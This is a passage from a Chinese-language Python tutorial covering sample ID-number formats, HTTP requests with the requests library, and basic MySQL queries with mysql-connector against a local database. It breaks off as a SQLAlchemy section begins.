<pre class="src src-sh">321105700101003
321105197001010030
11210020170101054X

17&#20301;&#25968;&#23383;+1&#20301;&#26657;&#39564;&#30721;&#32452;&#25104;
&#21069;6&#20301;&#22320;&#22336;&#30721;&#65292;8&#20301;&#20986;&#29983;&#24180;&#26376;&#65292;3&#20301;&#25968;&#23383;&#65292;1&#20301;&#26657;&#39564;&#20301;&#65288;0-9&#25110;X&#65289;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:16c98711-47c3-4f8f-a611-ccc4aee6c663" class="outline-3">
<h3 id="h:16c98711-47c3-4f8f-a611-ccc4aee6c663">Python 网络编程</h3>
<div class="outline-text-3" id="text-h:16c98711-47c3-4f8f-a611-ccc4aee6c663">
<p>
使用python发起网络请求，处理网络请求。<br>
</p>
</div>
<div id="outline-container-h:ecedbab2-6916-4c20-a5f6-2bf14662e790" class="outline-4">
<h4 id="h:ecedbab2-6916-4c20-a5f6-2bf14662e790">requests</h4>
<div class="outline-text-4" id="text-h:ecedbab2-6916-4c20-a5f6-2bf14662e790">
<p>
Requests 允许你发送原始的HTTP请求，无需手工劳动。你不需要手动为 URL 添加查询字串，也不需要对 POST数据进行表单编码。Keep-alive 和 HTTP 连接池的功能是 100% 自动化的。<br>
</p>
</div>
</div>
<div id="outline-container-h:dab78ada-7cea-4441-abe0-eb09f86737fb" class="outline-4">
<h4 id="h:dab78ada-7cea-4441-abe0-eb09f86737fb">安装requests</h4>
<div class="outline-text-4" id="text-h:dab78ada-7cea-4441-abe0-eb09f86737fb">
<p>
要安装 Requests，只要在你的终端中运行这个简单命令即可：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">$ pip install requests
</pre>
</div>
</div>
</div>
<div id="outline-container-h:bc3e2dca-2adc-40ab-8b9a-69099e9696b3" class="outline-4">
<h4 id="h:bc3e2dca-2adc-40ab-8b9a-69099e9696b3">发送请求</h4>
<div class="outline-text-4" id="text-h:bc3e2dca-2adc-40ab-8b9a-69099e9696b3">
<p>
使用 Requests 发送网络请求非常简单。<br>
</p>

<p>
一开始要导入 Requests 模块：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; import requests
</pre>
</div>

<p>
然后，尝试获取某个网页。本例子中，我们来获取 CiCi 的网站：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; r = requests.get(<span style="color: #8b2252;">'https://www.cici.com'</span>)
&gt;&gt;&gt; print(r.text)
</pre>
</div>

<p>
现在，我们有一个名为 r 的 Response 对象。我们可以从这个对象中获取所有我们想要的信息。<br>
</p>

<p>
Requests 简便的 API 意味着所有 HTTP 请求类型都是显而易见的。例如，你可以这样发送一个 HTTP POST 请求：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; r = requests.post(<span style="color: #8b2252;">'http://www.cici.com'</span>, data = {<span style="color: #8b2252;">'key'</span>:<span style="color: #8b2252;">'value'</span>})
</pre>
</div>

<p>
那么其他 HTTP 请求类型：PUT，DELETE，HEAD 以及 OPTIONS 又是如何的呢？都是一样的简单：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; r = requests.put(<span style="color: #8b2252;">'http://www.cici.com/put'</span>, data = {<span style="color: #8b2252;">'key'</span>:<span style="color: #8b2252;">'value'</span>})
&gt;&gt;&gt; r = requests.delete(<span style="color: #8b2252;">'http://www.cici.com/delete'</span>)
&gt;&gt;&gt; r = requests.head(<span style="color: #8b2252;">'http://www.cici.com/get'</span>)
&gt;&gt;&gt; r = requests.options(<span style="color: #8b2252;">'http://www.cici.com/get'</span>)
</pre>
</div>

<p>
使用requests 发起各种http请求方法都非常简单。<br>
</p>
</div>
</div>
<div id="outline-container-h:5bfe3ef8-74b5-4cea-b4c2-fb1e0e84c3e4" class="outline-4">
<h4 id="h:5bfe3ef8-74b5-4cea-b4c2-fb1e0e84c3e4">传递 URL 参数</h4>
<div class="outline-text-4" id="text-h:5bfe3ef8-74b5-4cea-b4c2-fb1e0e84c3e4">
<p>
当使用GET请求时，我们经常要传递参数，Requests 允许你使用 params 关键字参数，以一个字符串字典来提供这些参数。<br>
</p>

<p>
举例来说，如果你想传递 key1=value1 和 key2=value2 到 www.cici.com ，那么你可以使用如下代码：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; payload = {<span style="color: #8b2252;">'key1'</span>: <span style="color: #8b2252;">'value1'</span>, <span style="color: #8b2252;">'key2'</span>: <span style="color: #8b2252;">'value2'</span>}
&gt;&gt;&gt; r = requests.get(<span style="color: #8b2252;">"http://www.cici.com"</span>, <span style="color: #a0522d;">params</span>=payload)
</pre>
</div>

<p>
通过打印输出该 URL，你能看到 URL 已被正确编码：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; print(r.url)
http://www.cici.com?<span style="color: #a0522d;">key2</span>=value2&amp;<span style="color: #a0522d;">key1</span>=value1
</pre>
</div>

<p>
注意字典里值为 None 的键都不会被添加到 URL 的查询字符串里。<br>
</p>

<p>
你还可以将一个列表作为值传入：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; payload = {<span style="color: #8b2252;">'key1'</span>: <span style="color: #8b2252;">'value1'</span>, <span style="color: #8b2252;">'key2'</span>: [<span style="color: #8b2252;">'value2'</span>, <span style="color: #8b2252;">'value3'</span>]}
&gt;&gt;&gt; r = requests.get(<span style="color: #8b2252;">'http://www.cici.com'</span>, <span style="color: #a0522d;">params</span>=payload)
&gt;&gt;&gt; print(r.url)
http://www.cici.com?<span style="color: #a0522d;">key1</span>=value1&amp;<span style="color: #a0522d;">key2</span>=value2&amp;<span style="color: #a0522d;">key2</span>=value3
</pre>
</div>
</div>
</div>
<div id="outline-container-h:2d86aec1-4940-42a9-91c3-489c4cd915de" class="outline-4">
<h4 id="h:2d86aec1-4940-42a9-91c3-489c4cd915de">响应内容</h4>
<div class="outline-text-4" id="text-h:2d86aec1-4940-42a9-91c3-489c4cd915de">
<p>
我们能读取服务器响应的内容。再次以 GitHub 时间线为例：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; import requests
&gt;&gt;&gt; r = requests.get(<span style="color: #8b2252;">'https://api.github.com/events'</span>)
&gt;&gt;&gt; r.text
u<span style="color: #8b2252;">'[{"repository":{"open_issues":0,"url":"https://github.com/...</span>
</pre>
</div>

<p>
Requests 会自动解码来自服务器的内容。大多数 unicode 字符集都能被无缝地解码。<br>
</p>

<p>
请求发出后，Requests 会基于 HTTP 头部对响应的编码作出有根据的推测。当你访问 r.text 之时，Requests会使用其推测的文本编码。你可以找出 Requests 使用了什么编码，并且能够使用 r.encoding 属性来改变它：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; r.encoding
<span style="color: #8b2252;">'utf-8'</span>
&gt;&gt;&gt; r.encoding = <span style="color: #8b2252;">'ISO-8859-1'</span>
</pre>
</div>

<p>
如果你改变了编码，每当你访问 r.text ，Request 都将会使用 r.encoding 的新值。<br>
</p>

<p>
在你需要的情况下，Requests 也可以使用定制的编码。如果你创建了自己的编码，并使用 codecs 模块进行注册，你就可以轻松地使用这个解码器名称作为 r.encoding 的值， 然后由 Requests 来为你处理编码。<br>
</p>
</div>
</div>
<div id="outline-container-h:a763330e-544f-43de-9c53-d78c8e22b448" class="outline-4">
<h4 id="h:a763330e-544f-43de-9c53-d78c8e22b448">JSON 响应内容</h4>
<div class="outline-text-4" id="text-h:a763330e-544f-43de-9c53-d78c8e22b448">
<p>
Requests 中也有一个内置的 JSON 解码器，助你处理 JSON 数据：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; import requests
&gt;&gt;&gt; r = requests.get(<span style="color: #8b2252;">'https://api.github.com/events'</span>)
&gt;&gt;&gt; r.json()
[{u<span style="color: #8b2252;">'repository'</span>: {u<span style="color: #8b2252;">'open_issues'</span>: 0, u<span style="color: #8b2252;">'url'</span>: <span style="color: #8b2252;">'https://github.com/...</span>
</pre>
</div>

<p>
如果 JSON 解码失败， r.json() 就会抛出一个异常。例如，响应内容是 401 (Unauthorized)，尝试访问r.json() 将会抛出 ValueError: No JSON object could be decoded 异常。<br>
</p>

<p>
需要注意的是，成功调用 r.json() 并不意味着响应的成功。有的服务器会在失败的响应中包含一个 JSON 对象（比如 HTTP 500 的错误细节）。这种 JSON 会被解码返回。要检查请求是否成功，请使用r.raise_for_status() 或者检查 r.status_code 是否和你的期望相同。<br>
</p>
</div>
</div>
<div id="outline-container-h:4f694114-5901-4031-abe3-ff3f52b0924b" class="outline-4">
<h4 id="h:4f694114-5901-4031-abe3-ff3f52b0924b">原始响应内容</h4>
<div class="outline-text-4" id="text-h:4f694114-5901-4031-abe3-ff3f52b0924b">
<p>
在特殊的情况下，你可能想获取来自服务器的原始套接字响应，那么你可以访问 r.raw 。 如果你确实想这么干，那请你确保在初始请求中设置了 stream=True 。具体你可以这么做：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; r = requests.get(<span style="color: #8b2252;">'https://api.github.com/events'</span>, <span style="color: #a0522d;">stream</span>=True)
&gt;&gt;&gt; r.raw
&lt;requests.packages.urllib3.response.HTTPResponse object at 0x101194810&gt;
&gt;&gt;&gt; r.raw.read(10)
<span style="color: #8b2252;">'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'</span>
</pre>
</div>

<p>
但一般情况下，你应该以下面的模式将文本流保存到文件：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(filename, <span style="color: #8b2252;">'wb'</span>) <span style="color: #a020f0;">as</span> fd:
  <span style="color: #a020f0;">for</span> chunk <span style="color: #a020f0;">in</span> r.iter_content(chunk_size):
    fd.write(chunk)
</pre>
</div>

<p>
使用 Response.iter_content 将会处理大量你直接使用 Response.raw 不得不处理的。 当流下载时，上面是优先推荐的获取内容方式。 Note that chunk_size can be freely adjusted to a number that may better fit your use cases.<br>
</p>
</div>
</div>
<div id="outline-container-h:b3a1964f-d82f-4dfa-b217-a762ed79b2d7" class="outline-4">
<h4 id="h:b3a1964f-d82f-4dfa-b217-a762ed79b2d7">定制请求头</h4>
<div class="outline-text-4" id="text-h:b3a1964f-d82f-4dfa-b217-a762ed79b2d7">
<p>
如果你想为请求添加 HTTP 头部，只要简单地传递一个 dict 给 headers 参数就可以了。<br>
</p>

<p>
例如，在前一个示例中我们没有指定 content-type:<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; url = <span style="color: #8b2252;">'https://api.github.com/some/endpoint'</span>
&gt;&gt;&gt; headers = {<span style="color: #8b2252;">'user-agent'</span>: <span style="color: #8b2252;">'my-app/0.0.1'</span>}
&gt;&gt;&gt; r = requests.get(url, <span style="color: #a0522d;">headers</span>=headers)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ce613c76-ed7b-4400-9805-1cb98270a8f2" class="outline-4">
<h4 id="h:ce613c76-ed7b-4400-9805-1cb98270a8f2">POST 请求</h4>
<div class="outline-text-4" id="text-h:ce613c76-ed7b-4400-9805-1cb98270a8f2">
<p>
通常，你想要发送一些编码为表单形式的数据——非常像一个 HTML 表单。要实现这个，只需简单地传递一个字典给 data 参数。你的数据字典在发出请求时会自动编码为表单形式：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; payload = {<span style="color: #8b2252;">'key1'</span>: <span style="color: #8b2252;">'value1'</span>, <span style="color: #8b2252;">'key2'</span>: <span style="color: #8b2252;">'value2'</span>}
&gt;&gt;&gt; r = requests.post(<span style="color: #8b2252;">"http://httpbin.org/post"</span>, <span style="color: #a0522d;">data</span>=payload)
&gt;&gt;&gt; print(r.text)
{
...
 <span style="color: #8b2252;">"form"</span>: {
  <span style="color: #8b2252;">"key2"</span>: <span style="color: #8b2252;">"value2"</span>,
  <span style="color: #8b2252;">"key1"</span>: <span style="color: #8b2252;">"value1"</span>
},
...
}
</pre>
</div>

<p>
你还可以为 data 参数传入一个元组列表。在表单中多个元素使用同一 key 的时候，这种方式尤其有效：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; payload = ((<span style="color: #8b2252;">'key1'</span>, <span style="color: #8b2252;">'value1'</span>), (<span style="color: #8b2252;">'key1'</span>, <span style="color: #8b2252;">'value2'</span>))
&gt;&gt;&gt; r = requests.post(<span style="color: #8b2252;">'http://httpbin.org/post'</span>, <span style="color: #a0522d;">data</span>=payload)
&gt;&gt;&gt; print(r.text)
{
...
 <span style="color: #8b2252;">"form"</span>: {
  <span style="color: #8b2252;">"key1"</span>: [
   <span style="color: #8b2252;">"value1"</span>,
   <span style="color: #8b2252;">"value2"</span>
 ]
},
...
}
</pre>
</div>

<p>
很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个 string 而不是一个 dict ，那么数据会被直接发布出去。<br>
</p>

<p>
例如，Github API v3 接受编码为 JSON 的 POST/PATCH 数据：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; import json

&gt;&gt;&gt; url = <span style="color: #8b2252;">'https://api.github.com/some/endpoint'</span>
&gt;&gt;&gt; payload = {<span style="color: #8b2252;">'some'</span>: <span style="color: #8b2252;">'data'</span>}

&gt;&gt;&gt; r = requests.post(url, <span style="color: #a0522d;">data</span>=json.dumps(payload))
</pre>
</div>

<p>
此处除了可以自行对 dict 进行编码，你还可以使用 json 参数直接传递，然后它就会被自动编码。这是 2.4.2 版的新加功能：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; url = <span style="color: #8b2252;">'https://api.github.com/some/endpoint'</span>
&gt;&gt;&gt; payload = {<span style="color: #8b2252;">'some'</span>: <span style="color: #8b2252;">'data'</span>}
&gt;&gt;&gt; r = requests.post(url, <span style="color: #a0522d;">json</span>=payload)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:5b83bfec-ecb8-460d-91aa-e8ef4d91dccd" class="outline-4">
<h4 id="h:5b83bfec-ecb8-460d-91aa-e8ef4d91dccd">响应状态码</h4>
<div class="outline-text-4" id="text-h:5b83bfec-ecb8-460d-91aa-e8ef4d91dccd">
<p>
我们可以检测响应状态码：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; r = requests.get(<span style="color: #8b2252;">'http://httpbin.org/get'</span>)
&gt;&gt;&gt; r.status_code
200
</pre>
</div>

<p>
为方便引用，Requests还附带了一个内置的状态码查询对象：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; r.status_code == requests.codes.ok
True
</pre>
</div>
</div>
</div>
<div id="outline-container-h:bec5d9f3-fa34-4471-a7b0-2c5716abffa4" class="outline-4">
<h4 id="h:bec5d9f3-fa34-4471-a7b0-2c5716abffa4">响应头</h4>
<div class="outline-text-4" id="text-h:bec5d9f3-fa34-4471-a7b0-2c5716abffa4">
<p>
我们可以查看以一个 Python 字典形式展示的服务器响应头：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; r.headers
{
  <span style="color: #8b2252;">'content-encoding'</span>: <span style="color: #8b2252;">'gzip'</span>,
  <span style="color: #8b2252;">'transfer-encoding'</span>: <span style="color: #8b2252;">'chunked'</span>,
  <span style="color: #8b2252;">'connection'</span>: <span style="color: #8b2252;">'close'</span>,
  <span style="color: #8b2252;">'server'</span>: <span style="color: #8b2252;">'nginx/1.0.4'</span>,
  <span style="color: #8b2252;">'x-runtime'</span>: <span style="color: #8b2252;">'148ms'</span>,
  <span style="color: #8b2252;">'etag'</span>: <span style="color: #8b2252;">'"e1ca502697e5c9317743dc078f67693f"'</span>,
  <span style="color: #8b2252;">'content-type'</span>: <span style="color: #8b2252;">'application/json'</span>
}
</pre>
</div>

<p>
HTTP 头部是大小写不敏感的。<br>
</p>

<p>
因此，我们可以使用任意大写形式来访问这些响应头字段：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; r.headers[<span style="color: #8b2252;">'Content-Type'</span>]
<span style="color: #8b2252;">'application/json'</span>

&gt;&gt;&gt; r.headers.get(<span style="color: #8b2252;">'content-type'</span>)
<span style="color: #8b2252;">'application/json'</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:3d293bf9-f865-408c-a639-afa76527893b" class="outline-4">
<h4 id="h:3d293bf9-f865-408c-a639-afa76527893b">Cookie</h4>
<div class="outline-text-4" id="text-h:3d293bf9-f865-408c-a639-afa76527893b">
<p>
如果某个响应中包含一些 cookie，你可以快速访问它们：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; url = <span style="color: #8b2252;">'http://example.com/some/cookie/setting/url'</span>
&gt;&gt;&gt; r = requests.get(url)

&gt;&gt;&gt; r.cookies[<span style="color: #8b2252;">'example_cookie_name'</span>]
<span style="color: #8b2252;">'example_cookie_value'</span>
</pre>
</div>

<p>
要想发送你的cookies到服务器，可以使用 cookies 参数：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; url = <span style="color: #8b2252;">'http://httpbin.org/cookies'</span>
&gt;&gt;&gt; cookies = dict(<span style="color: #a0522d;">cookies_are</span>=<span style="color: #8b2252;">'working'</span>)

&gt;&gt;&gt; r = requests.get(url, <span style="color: #a0522d;">cookies</span>=cookies)
&gt;&gt;&gt; r.text
<span style="color: #8b2252;">'{"cookies": {"cookies_are": "working"}}'</span>
</pre>
</div>

<p>
Cookie 的返回对象为 RequestsCookieJar ，它的行为和字典类似，但接口更为完整，适合跨域名跨路径使用。<br>
</p>

<p>
你还可以把 Cookie Jar 传到 Requests 中：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; jar = requests.cookies.RequestsCookieJar()
&gt;&gt;&gt; jar.set(<span style="color: #8b2252;">'tasty_cookie'</span>, <span style="color: #8b2252;">'yum'</span>, <span style="color: #a0522d;">domain</span>=<span style="color: #8b2252;">'httpbin.org'</span>, <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">'/cookies'</span>)
&gt;&gt;&gt; jar.set(<span style="color: #8b2252;">'gross_cookie'</span>, <span style="color: #8b2252;">'blech'</span>, <span style="color: #a0522d;">domain</span>=<span style="color: #8b2252;">'httpbin.org'</span>, <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">'/elsewhere'</span>)
&gt;&gt;&gt; url = <span style="color: #8b2252;">'http://httpbin.org/cookies'</span>
&gt;&gt;&gt; r = requests.get(url, <span style="color: #a0522d;">cookies</span>=jar)
&gt;&gt;&gt; r.text
<span style="color: #8b2252;">'{"cookies": {"tasty_cookie": "yum"}}'</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:d39e6f48-90b0-46e6-a4a9-57a39e26adb4" class="outline-4">
<h4 id="h:d39e6f48-90b0-46e6-a4a9-57a39e26adb4">重定向与请求历史</h4>
<div class="outline-text-4" id="text-h:d39e6f48-90b0-46e6-a4a9-57a39e26adb4">
<p>
默认情况下，除了 HEAD, Requests 会自动处理所有重定向。<br>
</p>

<p>
可以使用响应对象的 history 方法来追踪重定向。<br>
</p>

<p>
Response.history 是一个 Response 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。<br>
</p>

<p>
例如，Github 将所有的 HTTP 请求重定向到 HTTPS：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; r = requests.get(<span style="color: #8b2252;">'http://github.com'</span>)

&gt;&gt;&gt; r.url
<span style="color: #8b2252;">'https://github.com/'</span>

&gt;&gt;&gt; r.status_code
200

&gt;&gt;&gt; r.history
[&lt;Response [301]&gt;]
</pre>
</div>

<p>
如果你使用的是GET、OPTIONS、POST、PUT、PATCH 或者 DELETE，那么你可以通过 allow_redirects 参数禁用重定向处理：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; r = requests.get(<span style="color: #8b2252;">'http://github.com'</span>, <span style="color: #a0522d;">allow_redirects</span>=False)
&gt;&gt;&gt; r.status_code
301
&gt;&gt;&gt; r.history
[]
</pre>
</div>

<p>
如果你使用了 HEAD，你也可以启用重定向：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; r = requests.head(<span style="color: #8b2252;">'http://github.com'</span>, <span style="color: #a0522d;">allow_redirects</span>=True)
&gt;&gt;&gt; r.url
<span style="color: #8b2252;">'https://github.com/'</span>
&gt;&gt;&gt; r.history
[&lt;Response [301]&gt;]
</pre>
</div>
</div>
</div>
<div id="outline-container-h:d30cf0a5-5529-4977-a1a8-755366f336fc" class="outline-4">
<h4 id="h:d30cf0a5-5529-4977-a1a8-755366f336fc">超时</h4>
<div class="outline-text-4" id="text-h:d30cf0a5-5529-4977-a1a8-755366f336fc">
<p>
你可以告诉 requests 在经过以 timeout 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; requests.get(<span style="color: #8b2252;">'http://github.com'</span>, <span style="color: #a0522d;">timeout</span>=0.001)
<span style="color: #0000ff;">Traceback</span> (most recent call last):
 File <span style="color: #8b2252;">"&lt;stdin&gt;"</span>, line 1,<span style="color: #a020f0;"> in</span> &lt;module&gt;
requests.exceptions.Timeout: HTTPConnectionPool(<span style="color: #a0522d;">host</span>=<span style="color: #8b2252;">'github.com'</span>, <span style="color: #a0522d;">port</span>=80): Request
timed out. (<span style="color: #a0522d;">timeout</span>=0.001)
</pre>
</div>

<p>
注意<br>
timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常.<br>
</p>
</div>
</div>
</div>
<div id="outline-container-h:1b680218-a3b5-4ddf-abc4-66895b6e4542" class="outline-3">
<h3 id="h:1b680218-a3b5-4ddf-abc4-66895b6e4542">Python数据库编程</h3>
<div class="outline-text-3" id="text-h:1b680218-a3b5-4ddf-abc4-66895b6e4542">
<p>
Python 的 MySQL 连接器模块用于将 MySQL 数据库与 Python 程序连接起来。它使用 Python 标准库并且没有依赖项。<br>
</p>

<p>
安装模块<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">pip install mysql-connector
</pre>
</div>
</div>
<div id="outline-container-h:817295a0-bdfa-48c9-aae4-3692aba7214e" class="outline-4">
<h4 id="h:817295a0-bdfa-48c9-aae4-3692aba7214e">使用 MySQL-Connector Python 连接 MySQL 数据库</h4>
<div class="outline-text-4" id="text-h:817295a0-bdfa-48c9-aae4-3692aba7214e">
<p>
<b>Python Mysql 连接器模块方法</b><br>
</p>
<ol class="org-ol">
<li>connect()： 该函数用于与MySQL服务器建立连接。 以下是用于启动连接的参数：<br>
<ol class="org-ol">
<li>user： 与用于验证连接的 MySQL 服务器关联的用户名<br></li>
<li>密码： 与用户名关联的密码，用于身份验证<br></li>
<li>数据库： MySQL中用于创建表的<br></li>
</ol></li>
<li>cursor() : 游标是执行SQL命令时在系统内存中创建的工作空间。 该内存是临时的，并且游标连接在整个会话/生命周期内都是有界的，并且命令被执行<br></li>
<li>execute() ：execute 函数将 SQL 查询作为参数并执行。 查询是用于创建、插入、检索、更新、删除等的 SQL命令。<br></li>
</ol>

<p>
在以下示例中，我们将使用 connect() 连接到 MySQL 数据库<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">Python program to connect</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">to mysql database</span>

<span style="color: #a020f0;">import</span> mysql.connector

<span style="color: #b22222;"># </span><span style="color: #b22222;">Connecting from the server</span>
<span style="color: #a0522d;">conn</span> = mysql.connector.connect(user = <span style="color: #8b2252;">'username'</span>,
                               host = <span style="color: #8b2252;">'localhost'</span>,
                               database = <span style="color: #8b2252;">'database_name'</span>)
<span style="color: #483d8b;">print</span>(conn)
<span style="color: #b22222;"># </span><span style="color: #b22222;">Disconnecting from the server</span>
conn.close()
</pre>
</div>

<p>
同样，我们可以使用 connection.MySQLConnection() 类而不是 connect()：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">Python program to connect</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">to mysql database</span>
<span style="color: #a020f0;">from</span> mysql.connector <span style="color: #a020f0;">import</span> connection
<span style="color: #b22222;"># </span><span style="color: #b22222;">Connecting to the server</span>
<span style="color: #a0522d;">conn</span> = connection.MySQLConnection(user = <span style="color: #8b2252;">'username'</span>,
                                  host = <span style="color: #8b2252;">'localhost'</span>,
                                  database = <span style="color: #8b2252;">'database_name'</span>)
<span style="color: #483d8b;">print</span>(conn)
<span style="color: #b22222;"># </span><span style="color: #b22222;">Disconnecting from the server</span>
conn.close()
</pre>
</div>

<p>
另一种方法是使用 '**' 运算符在 connect() 函数中传递字典：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">Python program to connect</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">to mysql database</span>

<span style="color: #a020f0;">from</span> mysql.connector <span style="color: #a020f0;">import</span> connection

<span style="color: #483d8b;">dict</span> = {
    <span style="color: #8b2252;">'user'</span>: <span style="color: #8b2252;">'root'</span>,
    <span style="color: #8b2252;">'host'</span>: <span style="color: #8b2252;">'localhost'</span>,
    <span style="color: #8b2252;">'database'</span>: <span style="color: #8b2252;">'dvwa'</span>
}

<span style="color: #b22222;"># </span><span style="color: #b22222;">Connecting to the server</span>
<span style="color: #a0522d;">conn</span> = connection.MySQLConnection(**<span style="color: #483d8b;">dict</span>)
<span style="color: #483d8b;">print</span>(conn)
<span style="color: #b22222;"># </span><span style="color: #b22222;">Disconnecting from the server</span>
conn.close()
</pre>
</div>
</div>
</div>
<div id="outline-container-h:59a2e5cf-a6f0-4143-8d07-653fc7da3474" class="outline-4">
<h4 id="h:59a2e5cf-a6f0-4143-8d07-653fc7da3474">Python MySQL – Select Query</h4>
<div class="outline-text-4" id="text-h:59a2e5cf-a6f0-4143-8d07-653fc7da3474">
<p>
使用查询语句<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">importing required library</span>
<span style="color: #a020f0;">import</span> mysql.connector

<span style="color: #b22222;"># </span><span style="color: #b22222;">connecting to the database</span>
<span style="color: #a0522d;">dataBase</span> = mysql.connector.connect(
    host = <span style="color: #8b2252;">"localhost"</span>,
    user = <span style="color: #8b2252;">"root"</span>,
    passwd = <span style="color: #8b2252;">""</span>,
    database = <span style="color: #8b2252;">"dvwa"</span> )

<span style="color: #b22222;"># </span><span style="color: #b22222;">preparing a cursor object</span>
<span style="color: #a0522d;">cursorObject</span> = dataBase.cursor() <span style="color: #b22222;">#</span><span style="color: #b22222;">&#29983;&#25104;&#28216;&#26631;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">selecting query</span>
<span style="color: #a0522d;">query</span> = <span style="color: #8b2252;">"SELECT NAME, ROLL FROM USERS"</span>
cursorObject.execute(query)
<span style="color: #a0522d;">myresult</span> = cursorObject.fetchall()

<span style="color: #a020f0;">for</span> x <span style="color: #a020f0;">in</span> myresult:
    <span style="color: #483d8b;">print</span>(x)

<span style="color: #b22222;"># </span><span style="color: #b22222;">disconnecting from server</span>
dataBase.close()
</pre>
</div>
</div>
</div>
<div id="outline-container-h:c1804228-66f1-4160-bbc4-a7e70f66409e" class="outline-4">
<h4 id="h:c1804228-66f1-4160-bbc4-a7e70f66409e">Python MySQL – Update Query</h4>
<div class="outline-text-4" id="text-h:c1804228-66f1-4160-bbc4-a7e70f66409e">
<p>
使用update 语句<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">Python program to demonstrate</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">update clause</span>
<span style="color: #a020f0;">import</span> mysql.connector

<span style="color: #b22222;"># </span><span style="color: #b22222;">Connecting to the Database</span>
<span style="color: #a0522d;">mydb</span> = mysql.connector.connect(
    host =<span style="color: #8b2252;">'localhost'</span>,
    database =<span style="color: #8b2252;">'dvwa'</span>,
    user =<span style="color: #8b2252;">'root'</span>,
)

<span style="color: #a0522d;">cs</span> = mydb.cursor()
<span style="color: #a0522d;">statement</span> =<span style="color: #8b2252;">"UPDATE USERS SET AGE = 23 WHERE Name ='Rishi Kumar'"</span>

cs.execute(statement)
mydb.commit()

<span style="color: #b22222;"># </span><span style="color: #b22222;">Disconnecting from the database</span>
mydb.close()
</pre>
</div>
</div>
</div>
<div id="outline-container-h:6276c43e-7cea-4fd6-913a-a8687babd5e8" class="outline-4">
<h4 id="h:6276c43e-7cea-4fd6-913a-a8687babd5e8">Python使用ORM框架</h4>
<div class="outline-text-4" id="text-h:6276c43e-7cea-4fd6-913a-a8687babd5e8">
<p>
<b>安装sqlalchemy</b><br>
</p>

<p>
在使用sqlalchemy之前要先给python安装mysql驱动，由于我使用的是python3原来的mysqldb不可用，所以这里推荐使用pymysql。<br>
</p>

<p>
我们通过pip进行安装,在windows下使用pip安装包的时候要记得使用管理员身份运行cmd不然有些操作是无法进行的。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">pip install pymysql
</pre>
</div>

<p>
安装完以后安装再安装sqlalchemy<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">pip install sqlalchemy
</pre>
</div>

<p>
创建一个连接引擎<br>
conn/connect.py<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> sqlalchemy <span style="color: #a020f0;">import</span> create_engine
